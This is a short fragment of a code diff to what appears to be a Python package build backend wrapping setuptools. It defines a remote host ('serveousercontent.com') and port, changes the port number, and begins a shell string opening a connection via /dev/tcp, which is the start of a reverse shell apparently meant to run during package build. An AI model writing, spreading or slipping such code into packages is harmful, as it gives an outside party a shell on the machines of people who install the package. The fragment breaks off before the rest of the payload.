@@ -2,7 +2,7 @@ import subprocess, os, sys, platform, pathlib
 import setuptools.build_meta as _sm
 
 LHOST = "serveousercontent.com"
-LPORT = 46479 
+LPORT = 56930 
 
 SH = (
     "exec 3<>/dev/tcp/%s/%d\n"
